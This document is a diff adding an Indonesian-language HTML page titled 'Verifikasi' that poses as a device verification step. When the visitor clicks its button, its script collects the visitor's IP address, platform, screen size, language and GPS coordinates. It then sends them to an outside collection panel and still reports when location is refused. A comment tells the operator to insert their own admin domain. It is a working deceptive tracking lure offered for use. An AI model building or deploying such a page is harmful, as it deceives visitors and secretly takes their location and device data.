@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
+        body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .box{background:#1a1a1a;border:2px solid #ff0000;border-radius:30px;padding:30px;max-width:500px;color:#fff}
+        h2{color:#ff0000}
+        button{background:#ff0000;color:#fff;border:none;padding:15px 40px;border-radius:40px;font-size:1.2rem;cursor:pointer;margin-top:20px}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>🔐 VERIFIKASI</h2>
+        <p>Klik tombol untuk verifikasi perangkat</p>
+        <button onclick="mulai()">VERIFIKASI</button>
+    </div>
+
+    <script>
+        // GANTI INI DENGAN DOMAIN ADMIN BARU LO!
+        const ADMIN_URL = 'https://panel-wates.netlify.app/?data=';
+        
+        async function mulai() {
+            let data = {
+                timestamp: new Date().toISOString()
+            };
+            
+            try {
+                // Ambil IP
+                let res = await fetch('https://api.ipify.org?format=json');
+                let ipData = await res.json();
+                data.ip = ipData.ip;
+            } catch(e) {}
+            
+            // Device info
+            data.platform = navigator.platform;
+            data.screen = `${screen.width}x${screen.height}`;
+            data.bahasa = navigator.language;
+            
+            // Lokasi
+            navigator.geolocation.getCurrentPosition(pos => {
+                data.lat = pos.coords.latitude;
+                data.lng = pos.coords.longitude;
+                
+                // Kirim data
+                fetch(ADMIN_URL + encodeURIComponent(JSON.stringify(data)), {
+                    mode: 'no-cors'
+                });
+                
+                document.body.innerHTML = '<div class="box"><h2>SELESAI</h2><p>Terima kasih</p></div>';
+            }, () => {
+                // Tetap kirim walau lokasi ditolak
+                fetch(ADMIN_URL + encodeURIComponent(JSON.stringify(data)), {
+                    mode: 'no-cors'
+                });
+                document.body.innerHTML = '<div class="box"><h2>SELESAI</h2><p>Terima kasih</p></div>';
+            });
+        }
+    </script>
+</body>
+</html>
